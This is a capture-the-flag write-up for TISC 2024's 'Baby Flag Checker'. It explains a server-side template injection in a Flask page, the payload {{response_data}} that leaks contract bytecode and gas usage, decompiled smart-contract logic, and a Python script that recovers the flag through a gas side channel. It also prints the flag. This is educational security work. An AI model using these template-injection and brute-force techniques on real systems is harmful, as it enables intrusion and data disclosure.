## About the Challenge
This challenge features a website. The website allows you to input a flag, and it tells you wheter your flag is correct or not.
![Main Page](/static/writeups/photos/babyflagchecker.png)

The source code for this challenge is given. The text on the top reads:
```
Don't forget to get the weekly keyphrase from DW! Check if your keyphrase is current on this website.

DISCLAIMER: We've recently migrated the keyphrase checking logic to smart contracts because of pressure from management to do something related to web3.
We've deployed the contract to a private network, so the keyphrase should be completely safe. Any vulnerabilities should be reported to management.
```

From this description, it seems the code is sent through a smart contract, which does the verification of the flag, and the output is then returned to the website.

The source code for the applications are provided, but the smart contract code is missing. We only have access to the Deployment script.

## Analysing the Source Code
There are 2 main services being run. The website service and the blockchain service. The blockchain service is a internal service, so we are unlikely to be able to directly access and write into the private network as we did for the previous challenge.

```python
@app.route('/submit', methods=['POST'])
def submit():
    password = request.form['password']
    try:
        if len(password) > 32:
            return render_template_string("""
        ...
        """)

        response = requests.post("http://server:5000/check", json={"password": password})
        response_data = response.json()

        return render_template_string("""
        ...
            <div class="container">
                <p>Result for """ + password + """:</p>
                {% if response_data["output"] %}
                <h1>Accepted</h1>
                {% else %}
                <h1>Invalid</h1>
                {% endif %}
                <a href="/">Go back</a>
            </div>
        ...
        """, response_data=response_data)
    except Exception as e:
        return str(e)
```
This is the submit endpoint on the website. It ensures the password is less than 32 characters long, then calls the *http://server:5000/check* endpoint with the provided password. *render_template_string* is being used, and the password is directly appended into the template string without any filtering. This means a [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) is present in the above code. However, our payload is restricted to 32 characters long, so our options for SSTI are limited. We will revisit this later.


```python
@app.post("/check")
async def check(password_input: PasswordInput):
    password = password_input.password
    
    try:
        web3_client = connect_to_anvil()
        setup_contract = init_setup_contract(web3_client)
        output_json = call_check_password(setup_contract, password)

        return output_json
    except RuntimeError as e:
        raise HTTPException(status_code=500, detail=str(e))
```
The check endpoint is above. The setup_contract is initialised, and then the call_check_password is called with the *password* provided by the user, which is then returned by the service.

```python
def call_check_password(setup_contract, password):
    # Call checkPassword function
    passwordEncoded = '0x' + bytes(password.ljust(32, '\0'), 'utf-8').hex()

    # Get result and gas used
    try:
        gas = setup_contract.functions.checkPassword(passwordEncoded).estimate_gas()
        output = setup_contract.functions.checkPassword(passwordEncoded).call()
        logger.info(f'Gas used: {gas}')
        logger.info(f'Check password result: {output}')
    except Exception as e:
        logger.error(f'Error calling checkPassword: {e}')

    # Return debugging information
    return {
        "output": output,
        "contract_address": setup_contract.address,
        "setup_contract_bytecode": os.environ['SETUP_BYTECODE'],
        "adminpanel_contract_bytecode": os.environ['ADMINPANEL_BYTECODE'],
        "secret_contract_bytecode": os.environ['SECRET_BYTECODE'],
        "gas": gas
    }
```
This is the *call_check_password* function, which runs the *checkPassword* function in the setup contract, and returns various data, like the output, the *bytecodes* of the different contracts, and the *gas* used. 

## SSTI
As mentioned previously, there is an SSTI present in the above code. We can't do the usual payloads, like RCE or CLI, as those typically require more than 32 characters. 

We can notice that the */check* endpoint actually returns much more data than just wheter the password is correct or not, but the code only returns the "output" value in the *response_data* variable

We can set password to be *{{response_data}}* to return the full response_data, which should contain the gas, and bytecodes of the different contracts.
![Response Data](/static/writeups/photos/babyflagchecker2.png)
```python
{
'output': False, 
'setup_contract_address': '0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0', 
'setup_contract_bytecode': '0x608060405234801561001057600080fd5b5060405161027838038061027883398101604081905261002f9161007c565b600080546001600160a01b039384166001600160a01b031991821617909155600180549290931691161790556100af565b80516001600160a01b038116811461007757600080fd5b919050565b6000806040838503121561008f57600080fd5b61009883610060565b91506100a660208401610060565b90509250929050565b6101ba806100be6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063410eee0214610030575b600080fd5b61004361003e366004610115565b610057565b604051901515815260200160405180910390f35b6000805460015460408051602481018690526001600160a01b0392831660448083019190915282518083039091018152606490910182526020810180516001600160e01b0316635449534360e01b17905290518493849316916100b99161012e565b6000604051808303816000865af19150503d80600081146100f6576040519150601f19603f3d011682016040523d82523d6000602084013e6100fb565b606091505b50915091508061010a9061015d565b600114949350505050565b60006020828403121561012757600080fd5b5035919050565b6000825160005b8181101561014f5760208186018101518583015201610135565b506000920191825250919050565b8051602080830151919081101561017e576000198160200360031b1b821691505b5091905056fea2646970667358221220e0f8333be083b807f8951d4868a6231b41254b2f6157a9fb62eff1bcefafd84e64736f6c63430008130033', 
'adminpanel_contract_bytecode': '0x60858060093d393df35f358060d81c64544953437b148160801b60f81c607d1401600214610022575f5ffd5b6004356098636b35340a6060526020606020901b186024356366fbf07e60205260205f6004603c845af4505f515f5f5b82821a85831a14610070575b9060010180600d146100785790610052565b60010161005e565b81600d1460405260206040f3', 
'secret_contract_bytecode': '0xREDACTED', 
'gas': 29283
}
```

## Understanding the Setup Contract
We have the bytecode and want to figure out what the contracts are doing. The secret contract bytecode is redacted, so we only have access to the adminpanel and the setup bytecode.

I used [Dedaub](https://app.dedaub.com) to reverse the bytecode. You'll need to undergo the decompilation a few times, since the bytecode seems to be loading another chunk of bytecode each time:<br>
*MEM[0:442] = 0x6080...*

The following code has been renamed for better readability.

[Setup](https://app.dedaub.com/decompile?md5=1133a2b5e7691c606da22239323c7380)
```solidity_RETRACT
function check_password(uint256 varg0) public payable { 
    require(msg.data.length - 4 >= 32);
    MEM[MEM[64] + 68] = addr1_in_storage;
    v0 = v1 = 0;
    while (v0 < 68) {
        MEM[v0 + MEM[64]] = MEM[32 + (MEM[64] + v0)];
        v0 += 32;
    }
    MEM[MEM[64] + 68] = 0;
    v2, /* uint256 */ v3, /* uint256 */ v4 = addr0_in_storage.call(68, 0x54495343, varg0).gas(msg.gas);
    if (RETURNDATASIZE() == 0) {
        v5 = v6 = 96;
    } else {
        v5 = v7 = new bytes[](RETURNDATASIZE());
        RETURNDATACOPY(v7.data, 0, RETURNDATASIZE());
    }
    correct = v9 = MEM[v4];
    if (MEM[v5] < 32) {
        correct = v10 = v9 & uint256.max << (32 - MEM[v5] << 3);
    }
    return 1 == correct;
}
```
We can take a look at the above function. This is the only function called by the function_selector in the setup contract, so we can assume this is likely our check_password function. The most notable part is this line:
```solidity
v2, /* uint256 */ v3, /* uint256 */ v4 = addr0_in_storage.call(68, 0x54495343, varg0).gas(msg.gas);
```
This seems to call a function from a contract stored in the 0th position in the storage. 

The first parameter likely contains the amount of bytes being parsed into the function 

The second parameter, *0x54495343* decodes to the string "TISC". This likely has something to do with the flag.

The third parameter is the password that the user guessed. We can deduce that this is likely performing some logic to check wheter the flag is correct or not.

In addition, it should be noted that the gas used in the transaction is also being forwarded to this unknown contract. We will revisit this later.

To find out what addr0_in_storage is, we can take a look at the deployment contract:
```solidity
Setup setup = new Setup(address(adminPanel), address(secret));
```
It seems the first parameter being fed into contract is the *AdminPanel*'s address. This likely corresponds to the address stored in *addr0_in_storage*, meaning the AdminPanel Contract was called in the above code.

## Understanding the AdminPanel Contract
We can perform the same process to reverse the AdminPanel Contract provided.

[AdminPanel](https://app.dedaub.com/decompile?md5=1133a2b5e7691c606da22239323c7380)
```solidity
function function_selector(bytes4 function_selector, uint256 varg1, uint256 varg2) public payable { 
    require(2 == (125 == function_selector << 128 >> 248) + (0x544953437b == function_selector >> 216));
    v0 = varg2.delegatecall(0x66fbf07e).gas(msg.gas);
    v1 = v2 = 0;
    v3 = v4 = 0;
    while (1) {
        if ((byte(keccak256(0x6b35340a) << 152 ^ varg1, v1)) == (byte(MEM[0x0], v1))) {
            // Unknown jump to Block 0x70. Refer to 3-address code (TAC);
        }
        v1 += 1;
        if (13 == v1) {
            return 13 == v3;
        }
        v3 += 1;
        // Unknown jump to Block 0x5e. Refer to 3-address code (TAC);
    }
}
```
The first line, *require(2 == (125 == function_selector << 128 >> 248) + (0x544953437b == function_selector >> 216));*, checks 2 conditions to be true. 

1. It checks that *125 == function_selector << 128 >> 248*. It performs a bitwise left shift of 128 bits on *function_selector*, then another bitwise right shift of 248 afterwards. 125 decodes to "}", which is conveniently the last character of the flag. This likely checks that the last character of our password is "}". 
2. It checks that *0x544953437b == function_selector >> 216*. It performs a bitwise right shift of 216 bits on *function_selector*, and checks that it is equal to *0x544953437b*. 0x544953437b decodes to "TISC{" This likely checks the first 5 characters of the input to be the valid TISC string.

## Explaining the Bitwise Shift
Since function_selector is 4 bytes long (32 bits), I found the bitwise shiftings strange, as they were all greater than 32 bits. After some investigating, here's what I think what's happening here:

As we know from the setup contract, *function_selector* is 68, which is 1 less than 1 byte long. This is why I think this parameter was excluded when we do the bitwise shifts later. The next parameter, *varg1*, contains the string "TISC". The user input comes after that, as *varg2*. 

Suppose our user input was `{ABCDEFGHIJK}0000000000000000000`. For sake of clarity, I will represent every 8 bits as 1 character. In memory, this will be how our data is being stored. The first X represents our function selector byte.

*`TISC{ABCDEFGHIJKL}0000000000000000000`*

By shifting to the left by 128 bits in the first check, we are effectively removing the first 16 characters from this data. I assumed this was because of some buffer overflow. This leaves us with:

*`}0000000000000000000`*

Then, shifting to the right by 248 bits, we effectively leave just the first 8 bits (1 character), since the total length of the remaining data should be 256 bits. This leaves us with just *}* for the last digit, which is then checked wheter it is the character "}" or not. In this case it is, so the check passes.

With this logic, the length of TISC{.... Excluding the closing "}" is 16 characters long. The total length of the flag should be 17 chracters long.

Applying this logic on the second check, which performs a bitwise right shift of 216 (27 bytes). This removes the last 27 characters of the original data, leaving us with:

*`TISC{`*

Since the TISC is already passed as varg0, our password should only contain the remaining parts of the flag, the "{XXXXXXX...}"
The contents within the brackets should be 16 - 5 - 1 = 11  characters long.

After this, we see some additional logic is performed:

*`v0 = varg2.delegatecall(0x66fbf07e).gas(msg.gas);`*

This likely has something to do with the secret contract. It likely edits some data in the memory/storage, which is then used in the next part.
```solidity
while (1) {
    if ((byte(keccak256(0x6b35340a) << 152 ^ varg1, v1)) == (byte(MEM[0x0], v1))) {
        // Unknown jump to Block 0x70. Refer to 3-address code (TAC);
    }
    v1 += 1;
    if (13 == v1) {
        return 13 == v3;
    }
    v3 += 1;
    // Unknown jump to Block 0x5e. Refer to 3-address code (TAC);
}
```
This seems to be performing some sort of encryption on each character in our string. We can't see the logic that is run when the condition passes, but we can assume that this check is likely to check wheter that character is correct or not, and then some additional logic is performed.

## Gas Gas Gas
The **gas cost** is one of the only other information we have from the response_data that might prove useful. In a smart contract, gas is a measure of how much it costs to transact on the blockchain. **Every computation** in a smart contract will increase the gas fees. We know that some unknown code is executed when a character is valid, but most likely, this code is some computation which will **increase the gas used by the contract**.

As such, we should be able to **guess each letter** one by one by sending a request to the */submit* endpoint of the website, together with our **SSTI** to read back the gas price. If the gas price is different from what we expect, it means that this character is likely correct, and we can guess the next letter.

As deduced from before, our password must be at least 17 characters long, with the first and last characters being "{" and "}" respectively, in order for the initial checks to pass. To retrieve the gas, we can log out the response data by adding **{{response_data}}** to the end of the above payload, since anything that follows the initial password is truncated anyways.
For example

*`{AXXXXXXXXXX}{{response_data}}`*

attempts to guess the first character of the password, and exfiltrates the gas as well. The X's represent null bytes.

```python
import requests

expected = "29367"
freq = {}
def get_gas(payload):
    url = "http://chals.tisc24.ctf.sg:52416/submit"
    data = {"password": payload}
    response = requests.post(url, data=data)
    try:
        gas = response.text.split(" &#39;gas&#39;: ")[1].split("}")[0]
    except:
        print(response.text)
        return False
    return gas

soFar = ""
for i in range(11):
    # gets the expected gas value
    text = chr(1)
    part1 = "{"+soFar+text+chr(0)*(10-len(soFar))+"}"
    payload = part1+"{{response_data}}"
    expected = get_gas(payload)
    for i in range(2,127):
        text = chr(i)
        part1 = "{"+soFar+text+chr(0)*(10-len(soFar))+"}"
        payload = part1+"{{response_data}}"
        gas = get_gas(payload)
        # Find the gas value that's different from the expected value
        if gas != expected and gas != False:
            soFar += text
            break
    print(soFar)
print(soFar)
```

Running the above code, we can retrieve our flag

## Flag
```text
TISC{g@s_Ga5_94S}
```